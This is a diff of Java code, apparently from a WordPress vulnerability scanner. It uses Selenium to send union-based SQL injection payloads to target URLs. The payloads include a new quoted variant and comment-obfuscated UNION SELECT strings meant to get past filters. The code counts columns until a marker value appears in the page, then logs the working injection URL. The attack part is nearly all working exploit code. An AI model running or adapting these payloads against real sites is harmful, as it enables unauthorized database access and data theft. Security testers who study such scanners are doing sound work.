@@ -363,8 +363,8 @@ public class Model {
 	
 	public void testSQLiWordpress(String fullUrl, final int numLog){
 		this.setInitiate();
-		//final String url = getOnlyHostName(fullUrl);
-		final String url = fullUrl;
+		final String url = getOnlyHostName(fullUrl);
+
 		this.setTestRunning(true);
 		
 		new Thread(new Runnable() {
@@ -377,9 +377,10 @@ public class Model {
 				
 				String temp;
 				String query = "-5+/*!12345UNION*/+/*!12345SELECT*/+";
+				String queryWithQuot = "-5'+/*!12345UNION*/+/*!12345SELECT*/+";
 				String endQuery = "+--";
 				
-				int numOfColumn = 100; // defined number of columns of table in database
+				int numOfColumn = 50; // defined number of columns of table in database
 				String checkWPSQLi = "999999999999999999999999999999";
 				
 				filemanager.writeLine("================================================================");
@@ -393,7 +394,7 @@ public class Model {
 						
 						String tempColumn = "";
 						String sourcePage = "";
-						boolean resultTesting = false;
+						int resultTesting = 0;
 						
 						for(int i = 1; i <= numOfColumn; i++){
 							
@@ -403,20 +404,33 @@ public class Model {
 							sourcePage = driver.getPageSource();
 							
 							if(sourcePage.indexOf(checkWPSQLi) >= 0){
-								resultTesting = true;
+								resultTesting = 1;
+								break;
+							}
+							
+							driver.get(url + temp + queryWithQuot + tempColumn + endQuery);
+							sourcePage = driver.getPageSource();
+							
+							if(sourcePage.indexOf(checkWPSQLi) >= 0){
+								resultTesting = 2;
 								break;
 							}
 							
 							tempColumn += ",";
 							
 						}
-						
-						filemanager.writeLine(temp + query + tempColumn + endQuery);
-						
-						if(resultTesting) filemanager.writeLine("Yes");
-						else filemanager.writeLine("No");
 
-						
+						if(resultTesting == 0){
+							filemanager.writeLine(temp);
+							filemanager.writeLine("No");						
+						} else if(resultTesting == 1){
+							filemanager.writeLine(temp + query + tempColumn + endQuery);
+							filemanager.writeLine("Yes");						
+						} else {
+							filemanager.writeLine(temp + queryWithQuot + tempColumn + endQuery);
+							filemanager.writeLine("Yes");
+						}
+		
 					} catch (Exception e){
 						e.printStackTrace();
 					}
